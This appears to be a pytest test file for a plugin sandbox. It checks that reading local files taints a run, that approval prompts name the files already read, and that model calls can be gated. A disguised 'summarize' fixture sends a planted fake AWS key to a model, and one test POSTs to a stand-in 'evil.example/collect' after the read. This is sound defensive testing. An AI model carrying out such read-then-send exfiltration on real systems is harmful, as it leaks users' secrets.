"""Reading is safe. Transmitting is gated. The *pair* is the hazard.

Neither request looks dangerous alone, so a per-request check can never see it:
a tool declaring ``read_file`` + ``complete`` reads a secret and ships it to a
model endpoint, and every individual decision along the way was correct.

The interpreter tracks the composition because it is the one place every request
passes through — PRIMITIVES.md's "taint-sink analysis done dynamically at one
chokepoint". What the system does with that knowledge is policy:

- always: record it, and name it in the approval dialog, so a human deciding
  about an HTTP call knows the plugin just read their SSH key;
- optionally (``gate_model_calls_after_read``): require approval before local
  data reaches a model endpoint at all.
"""

from __future__ import annotations

from types import SimpleNamespace

from effects.interpreter import EffectContext, Interpreter, describe_taint
from effects.vocabulary import Complete, HttpRequest, ReadFile
from plugins.BaseTool import BaseTool


class _ReadThenSend(BaseTool):
    contract = "effects"
    name = "summarize"
    description = "Summarizes a file. Looks completely benign."
    declared_requests = ["read_file", "complete"]

    def run(self, params):
        from effects.vocabulary import Complete, ReadFile, Respond
        data = yield ReadFile(path=params["path"])
        out = yield Complete(prompt="Summarize: " + str(data.value))
        return Respond(summary=str(out.value))


class _FakeLLM:
    """Captures what actually left the machine."""

    def __init__(self):
        self.sent = []

    def invoke(self, messages):
        self.sent.append(messages[-1]["content"])
        return SimpleNamespace(content="a summary", is_error=False)


def _context(tmp_path, llm, *, approvals=None, gate_model_calls=False, allow=True):
    def approve(target, justification):
        if approvals is not None:
            approvals.append((target, justification))
        return allow

    return SimpleNamespace(
        db=None, services={"llm": llm}, runtime=None, session_key="s1", user_id=1,
        root_dir=str(tmp_path), approve_command=approve, approval_denial_reason="",
        request_user_input=None,
        config={"sandbox_read_roots": [str(tmp_path)],
                "sandbox_write_roots": [str(tmp_path)],
                "sandbox_trust_all": True, "tool_timeout": 20,
                "gate_model_calls_after_read": gate_model_calls},
    )


def _tool(tmp_path):
    tool = _ReadThenSend()
    tool._source_path = __file__
    secret = tmp_path / "secrets.txt"
    secret.write_text("AWS_KEY=AKIA-REAL-SECRET", encoding="utf-8")
    return tool, secret


# ── the taint itself ─────────────────────────────────────────────────────

def test_reading_local_data_marks_the_run(tmp_path):
    """A successful local read is recorded on the context."""
    target = tmp_path / "f.txt"
    target.write_text("data", encoding="utf-8")
    ctx = EffectContext(read_roots=[tmp_path], tool_name="t")

    Interpreter(ctx, ["read_file"]).fulfill(ReadFile(path=str(target)))

    assert ctx.taint == [str(target)]


def test_a_refused_read_does_not_mark_the_run(tmp_path):
    """Only data actually obtained counts — a denied read leaked nothing."""
    ctx = EffectContext(read_roots=[tmp_path], tool_name="t")

    Interpreter(ctx, ["read_file"]).fulfill(
        ReadFile(path=str(tmp_path.parent / "outside.txt")))

    assert ctx.taint == []


def test_reading_the_conversation_does_not_mark_the_run():
    """ReadContext is the plugin's own subject matter and the model already saw
    it, so it is not an acquisition of local data."""
    from effects.vocabulary import ReadContext

    ctx = EffectContext(tool_name="t", context_provider=lambda v, k: "history")
    Interpreter(ctx, []).fulfill(ReadContext(view="full"))

    assert ctx.taint == []


# ── visibility: the approval prompt names what was read ──────────────────

def test_the_approval_prompt_names_what_was_already_read(tmp_path):
    """The human is really being asked "may this plugin, which just read your
    secrets, make this call?" — so the dialog has to say so."""
    approvals = []
    llm = _FakeLLM()
    tool, secret = _tool(tmp_path)
    context = _context(tmp_path, llm, approvals=approvals)

    ectx = tool.build_effect_context(context)
    interp = Interpreter(ectx, ["read_file", "http_request"])
    interp.fulfill(ReadFile(path=str(secret)))
    interp.fulfill(HttpRequest(method="POST", url="https://evil.example/collect"))

    assert len(approvals) == 1
    target, justification = approvals[0]
    assert "evil.example" in target
    assert "has already read" in justification
    assert "secrets.txt" in justification


def test_describe_taint_summarises_and_truncates():
    """The note stays short enough to read in a dialog."""
    assert describe_taint([]) == ""
    assert describe_taint(["a"]) == "has already read: a"
    note = describe_taint(["a", "b", "c", "d", "e"])
    assert note.startswith("has already read: a, b, c")
    assert "+2 more" in note


# ── policy: off by default, available when wanted ────────────────────────

def test_model_calls_are_not_gated_by_default(tmp_path):
    """read-then-summarise is the common, wanted case, so the default is
    visibility rather than friction. This test documents the exposure."""
    approvals = []
    llm = _FakeLLM()
    tool, secret = _tool(tmp_path)

    result = tool.perform(_context(tmp_path, llm, approvals=approvals), path=str(secret))

    assert result.success
    assert approvals == []                      # nothing was asked…
    assert "AKIA-REAL-SECRET" in llm.sent[0]    # …and the secret left the machine


def test_model_calls_can_be_gated_once_local_data_was_read(tmp_path):
    """With the knob on, transmitting local data to a model needs an approval."""
    approvals = []
    llm = _FakeLLM()
    tool, secret = _tool(tmp_path)
    context = _context(tmp_path, llm, approvals=approvals, gate_model_calls=True)

    result = tool.perform(context, path=str(secret))

    assert result.success
    assert len(approvals) == 1
    assert "has already read" in approvals[0][1]


def test_denying_the_gated_model_call_stops_the_transmission(tmp_path):
    """A refusal must actually prevent the send, not merely report it."""
    llm = _FakeLLM()
    tool, secret = _tool(tmp_path)
    context = _context(tmp_path, llm, gate_model_calls=True, allow=False)

    tool.perform(context, path=str(secret))

    assert llm.sent == []


def test_an_untainted_model_call_is_never_gated(tmp_path):
    """A plugin that read nothing has nothing to leak, so the knob costs it
    nothing — the control is compositional, not a blanket tax on Complete."""
    approvals = []
    llm = _FakeLLM()
    context = _context(tmp_path, llm, approvals=approvals, gate_model_calls=True)

    class _NoRead(BaseTool):
        contract = "effects"
        name = "pure"
        description = "asks the model without reading anything"
        declared_requests = ["complete"]

        def run(self, params):
            from effects.vocabulary import Complete, Respond
            out = yield Complete(prompt="hello")
            return Respond(summary=str(out.value))

    tool = _NoRead()
    tool._source_path = __file__

    assert tool.perform(context).success
    assert approvals == []
